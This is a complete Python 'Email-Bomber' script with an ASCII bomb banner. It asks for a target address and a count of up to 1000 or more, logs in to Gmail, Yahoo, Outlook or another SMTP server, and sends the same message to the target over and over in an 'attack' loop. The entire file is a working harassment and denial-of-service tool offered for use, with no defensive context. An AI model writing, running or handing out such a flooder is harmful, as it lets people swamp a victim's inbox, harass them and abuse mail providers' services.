import smtplib
import sys

class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    RESET = '\033[0m'

def banner():
    print(bcolors.GREEN + '+[+[+[ Email-Bomber v1.0 ]+]+]+')
    print(bcolors.GREEN + '+[+[+[ made with codes ]+]+]+')
    print(bcolors.GREEN + '''
           \|/
           `--+--'
              |
          ,--'#`--.
          |#######|
       _.-'#######`-._
    ,-'###############`-.
  ,'#####################`,         .___     .__         .
 |#########################|        [__ ._ _ [__) _ ._ _ |_  _ ._.
|###########################|       [___[ | )[__)(_)[ | )[_)(/,[
|#############################|
|#############################|
|#############################|
 |###########################|
  \#########################/
   `.#####################,'
     `._###############_,'
        `--..#####..--'                                 ,-.--.
*.______________________________________________________________,' (Bomb)
                                                        `--' 
    ''' + bcolors.RESET)

class email_bomber:
    count = 0

    def __init__(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Initializing program ]+]+]+' + bcolors.RESET)
            self.target = str(input(bcolors.GREEN + 'Provide email of the target -> ' + bcolors.RESET))
            self.mode = int(input(bcolors.GREEN + 'choose a mode (1,2,3,4) // 1:(Mode 1: 1000+) 2:(Mode 2: 500+) 3:(Mode 3: 250+) 4:(mode 4: custom ) -> ' + bcolors.RESET))
            if self.mode > 4 or self.mode < 1:
                print(bcolors.RED + 'choose the given option' + bcolors.RESET)
                sys.exit(1)
        except Exception as e:
            print(bcolors.RED + f'Error: {e}' + bcolors.RESET)
            sys.exit(1)

    def bomb(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Setting up bomb ]+]+]+' + bcolors.RESET)
            self.amount = None
            if self.mode == 1:
                self.amount = 1000
            elif self.mode == 2:
                self.amount = 500
            elif self.mode == 3:
                self.amount = 250
            else:
                self.amount = int(input(bcolors.GREEN + 'mode 4: -> ' + bcolors.RESET))
            print(bcolors.RED + f'\n+[+[+[ You have selected BOMB mode: {self.mode} and {self.amount} emails ]+]+]+' + bcolors.RESET)
        except Exception as e:
            print(bcolors.RED + f'ERROR: {e}' + bcolors.RESET)

    def email(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Setting up email ]+]+]+' + bcolors.RESET)
            self.server = str(input(bcolors.GREEN + 'Enter email server | or select premade options - 1:Gmail 2:Yahoo 3:Outlook <: ' + bcolors.RESET))
            premade = ['1', '2', '3']
            default_port = True
            if self.server not in premade:
                self.port = int(input(bcolors.GREEN + 'Enter port number <: ' + bcolors.RESET))
            else:
                self.port = 587

            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'

            self.fromAddr = str(input(bcolors.GREEN + 'Enter from address: ' + bcolors.RESET))
            self.fromPwd = str(input(bcolors.GREEN + 'Enter password: ' + bcolors.RESET))
            self.subject = str(input(bcolors.GREEN + 'Enter subject: ' + bcolors.RESET))
            self.message = str(input(bcolors.GREEN + 'Enter message: ' + bcolors.RESET))

            self.msg = '''From: %s\nTo: %s\nSubject: %s\n%s\n
            ''' % (self.fromAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(bcolors.RED + f'ERROR: {e}' + bcolors.RESET)

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count += 1
            print(bcolors.YELLOW + f'BOMB: {self.count}' + bcolors.RESET)
        except Exception as e:
            print(bcolors.RED + f'ERROR: {e}' + bcolors.RESET)

    def attack(self):
        print(bcolors.RED + '\n+[+[+[ Attacking... ]+]+]+' + bcolors.RESET)
        for email in range(self.amount):
            self.send()
        self.s.close()
        print(bcolors.RED + '\n+[+[+[ Attack finished ]+]+]+' + bcolors.RESET)
        sys.exit(0)

if __name__ == '__main__':
    banner()
    bomb = email_bomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()
